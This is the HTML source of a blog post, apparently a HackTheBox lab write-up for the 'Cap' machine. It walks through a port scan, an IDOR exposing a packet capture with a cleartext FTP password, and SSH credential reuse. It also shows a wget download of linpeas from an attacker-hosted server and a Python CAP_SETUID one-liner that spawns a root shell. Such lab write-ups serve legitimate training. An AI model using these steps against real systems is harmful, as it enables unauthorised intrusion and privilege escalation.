@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HTB - Cap | Fabio Birnegger</title>
+<meta name="keywords" content="HTB, Linux, Write-Up">
+<meta name="description" content="Box Details
+
+  
+      
+          
+          
+      
+  
+  
+      
+          Difficulty
+          Easy
+      
+      
+          Type
+          Linux
+      
+  
+
+Port Scan
+└─$ nmap -sV 10.129.7.242 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 17:11 &#43;0100
+Nmap scan report for 10.129.7.242
+Host is up (0.037s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Gunicorn
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.23 seconds
+User Flag
+On port 80 there is a web application in which we are logged in by default as the user Nathan. In the application we can check out different network stuff. When we click the burger menu and select Security Snapshot we can download a .pcap file. Seems like every time we visit this page, a new file gets created. There is an IDOR vulnerability through which we can visit the page http://10.10.10.245/data/0 which was already there.">
+<meta name="author" content="Fabio Birnegger">
+<link rel="canonical" href="http://localhost:1313/writeups/htb_cap/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.a29c24210eb31d9ce56f669c66a35c9c51b17376b7764e336a49af7dec914cf0.css" integrity="sha256-opwkIQ6zHZzlb2acZqNcnFGxc3a3dk4zakmvfeyRTPA=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/htb_cap/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/writeups/htb_cap/">
+  <meta property="og:site_name" content="Fabio Birnegger">
+  <meta property="og:title" content="HTB - Cap">
+  <meta property="og:description" content="Box Details Difficulty Easy Type Linux Port Scan └─$ nmap -sV 10.129.7.242 Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 17:11 &#43;0100Nmap scan report for 10.129.7.242Host is up (0.037s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80/tcp open http GunicornService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 17.23 seconds User Flag On port 80 there is a web application in which we are logged in by default as the user Nathan. In the application we can check out different network stuff. When we click the burger menu and select Security Snapshot we can download a .pcap file. Seems like every time we visit this page, a new file gets created. There is an IDOR vulnerability through which we can visit the page http://10.10.10.245/data/0 which was already there.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-02-28T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-02-28T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Write-Up">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB - Cap">
+<meta name="twitter:description" content="Box Details
+
+  
+      
+          
+          
+      
+  
+  
+      
+          Difficulty
+          Easy
+      
+      
+          Type
+          Linux
+      
+  
+
+Port Scan
+└─$ nmap -sV 10.129.7.242 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 17:11 &#43;0100
+Nmap scan report for 10.129.7.242
+Host is up (0.037s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Gunicorn
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.23 seconds
+User Flag
+On port 80 there is a web application in which we are logged in by default as the user Nathan. In the application we can check out different network stuff. When we click the burger menu and select Security Snapshot we can download a .pcap file. Seems like every time we visit this page, a new file gets created. There is an IDOR vulnerability through which we can visit the page http://10.10.10.245/data/0 which was already there.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HTB - Cap",
+      "item": "http://localhost:1313/writeups/htb_cap/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB - Cap",
+  "name": "HTB - Cap",
+  "description": "Box Details Difficulty Easy Type Linux Port Scan └─$ nmap -sV 10.129.7.242 Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 17:11 +0100\rNmap scan report for 10.129.7.242\rHost is up (0.037s latency).\rNot shown: 997 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\r80/tcp open http Gunicorn\rService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 17.23 seconds User Flag On port 80 there is a web application in which we are logged in by default as the user Nathan. In the application we can check out different network stuff. When we click the burger menu and select Security Snapshot we can download a .pcap file. Seems like every time we visit this page, a new file gets created. There is an IDOR vulnerability through which we can visit the page http://10.10.10.245/data/0 which was already there.\n",
+  "keywords": [
+    "HTB", "Linux", "Write-Up"
+  ],
+  "articleBody": "Box Details Difficulty Easy Type Linux Port Scan └─$ nmap -sV 10.129.7.242 Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 17:11 +0100\rNmap scan report for 10.129.7.242\rHost is up (0.037s latency).\rNot shown: 997 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\r80/tcp open http Gunicorn\rService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 17.23 seconds User Flag On port 80 there is a web application in which we are logged in by default as the user Nathan. In the application we can check out different network stuff. When we click the burger menu and select Security Snapshot we can download a .pcap file. Seems like every time we visit this page, a new file gets created. There is an IDOR vulnerability through which we can visit the page http://10.10.10.245/data/0 which was already there.\nIf we download it and look through it with e.g. WireShark, we can find captured packets from a FTP login process. We can see credentials in clear-text:\nuser: nathan\rpass: Buck3tH4TF0RM3! With these credentials we can access the FTP server running on the standard port 21 at the target:\nWe can ls the files and find a user.txt. Download the file with get user.txt and obtain the user flag.\nRoot Flag As always we should consider credential-reuse. I tried to use the previously obtained FTP credentials to connect to the target via SSH which was successful. We are now connected to the target as the user Nathan.\nWhat we could do now is to start automatic enumeration with LinPeas.sh. To do so we can download the script to our kali machine and host a simple python web server in the download directory with $ python3 -m http.server 80. On the target machine we use $ wget KALI_IP/linpeas.sh to download the file into the users home directory followed by $ chmod +x ./linpeas.sh to make it executable. We can now start the automatic Linux enumartion tool with $ ./linpeas.sh.\nIf we scroll down in the output we can see that the script found that /usr/bin/python3.8 has special capabilities set:\nWe could have found this by manual enumeration as well:\n$ /usr/sbin/getcap -r / 2\u003e/dev/null With this information we can go to GTFOBins and search for Python. We look under Shell → Capabilities and can see that when the CAP_SETUID capabilitiy is set (which is the case as we learned above) we may try the following command to escalate our privileges:\npython -c 'import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")' The privilege escalation worked and we successfully spawned a root shell:\n",
+  "wordCount" : "458",
+  "inLanguage": "en",
+  "datePublished": "2026-02-28T00:00:00Z",
+  "dateModified": "2026-02-28T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Fabio Birnegger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/htb_cap/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Fabio Birnegger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Fabio Birnegger (Alt + H)">Fabio Birnegger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/writeups/" title="Write-ups">
+                    <span>Write-ups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/publications/" title="Publications &amp; Talks">
+                    <span>Publications &amp; Talks</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="whoami">
+                    <span>whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      HTB - Cap
+    </h1>
+    <div class="post-meta"><span title='2026-02-28 00:00:00 +0000 UTC'>February 28, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>Fabio Birnegger</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul><ul><ul>
+                <li>
+                    <a href="#box-details" aria-label="Box Details">Box Details</a></li>
+                <li>
+                    <a href="#port-scan" aria-label="Port Scan">Port Scan</a></li></ul>
+                    </ul>
+                    
+                <li>
+                    <a href="#user-flag" aria-label="User Flag">User Flag</a></li>
+                <li>
+                    <a href="#root-flag" aria-label="Root Flag">Root Flag</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h4 id="box-details">Box Details<a hidden class="anchor" aria-hidden="true" href="#box-details">#</a></h4>
+<table>
+  <thead>
+      <tr>
+          <th></th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Difficulty</td>
+          <td>Easy</td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Linux</td>
+      </tr>
+  </tbody>
+</table>
+<h4 id="port-scan">Port Scan<a hidden class="anchor" aria-hidden="true" href="#port-scan">#</a></h4>
+<pre tabindex="0"><code>└─$ nmap -sV 10.129.7.242 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 17:11 +0100
+Nmap scan report for 10.129.7.242
+Host is up (0.037s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Gunicorn
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.23 seconds
+</code></pre><h2 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h2>
+<p>On port 80 there is a web application in which we are logged in by default as the user <strong>Nathan</strong>. In the application we can check out different network stuff. When we click the burger menu and select <strong>Security Snapshot</strong> we can download a <em>.pcap</em> file. Seems like every time we visit this page, a new file gets created. There is an <strong>IDOR</strong> vulnerability through which we can visit the page <code>http://10.10.10.245/data/0</code> which was already there.</p>
+<p><img loading="lazy" src="/images/writeup_screens/htb_cap/htb_cap_4.png"></p>
+<p>If we download it and look through it with e.g. <em>WireShark</em>, we can find captured packets from a <em>FTP</em> login process. We can see credentials in clear-text:</p>
+<p><img loading="lazy" src="/images/writeup_screens/htb_cap/htb_cap_1.png"></p>
+<pre tabindex="0"><code>user: nathan
+pass: Buck3tH4TF0RM3!
+</code></pre><p>With these credentials we can access the <em>FTP</em> server running on the standard port 21 at the target:</p>
+<p><img loading="lazy" src="/images/writeup_screens/htb_cap/htb_cap_2.png"></p>
+<p>We can <code>ls</code> the files and find a <code>user.txt</code>. Download the file with <code>get user.txt</code> and obtain the user flag.</p>
+<hr>
+<h2 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h2>
+<p>As always we should consider credential-reuse. I tried to use the previously obtained <em>FTP</em> credentials to connect to the target via <em>SSH</em> which was successful. We are now connected to the target as the user <strong>Nathan</strong>.</p>
+<p>What we could do now is to start automatic enumeration with <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS"><em>LinPeas.sh</em></a>. To do so we can download the script to our kali machine and host a simple python web server in the download directory with <code>$ python3 -m http.server 80</code>. On the target machine we use <code>$ wget KALI_IP/linpeas.sh</code> to download the file into the users home directory followed by <code>$ chmod +x ./linpeas.sh</code> to make it executable. We can now start the automatic Linux enumartion tool with <code>$ ./linpeas.sh</code>.</p>
+<p>If we scroll down in the output we can see that the script found that <em>/usr/bin/python3.8</em> has special capabilities set:</p>
+<p><img loading="lazy" src="/images/writeup_screens/htb_cap/htb_cap_3.png"></p>
+<p>We could have found this by manual enumeration as well:</p>
+<pre tabindex="0"><code>$ /usr/sbin/getcap -r / 2&gt;/dev/null
+</code></pre><p><img loading="lazy" src="/images/writeup_screens/htb_cap/htb_cap_5.png"></p>
+<p>With this information we can go to <a href="https://gtfobins.org/">GTFOBins</a> and search for <em>Python</em>. We look under <strong>Shell</strong> → <strong>Capabilities</strong> and can see that when the <em>CAP_SETUID</em> capabilitiy is set (which is the case as we learned above) we may try the following command to escalate our privileges:</p>
+<pre tabindex="0"><code>python -c &#39;import os; os.setuid(0); os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;)&#39;
+</code></pre><p>The privilege escalation worked and we successfully spawned a root shell:</p>
+<p><img loading="lazy" src="/images/writeup_screens/htb_cap/htb_cap_6.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/htb/">HTB</a></li>
+      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
+      <li><a href="http://localhost:1313/tags/write-up/">Write-Up</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Fabio Birnegger</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
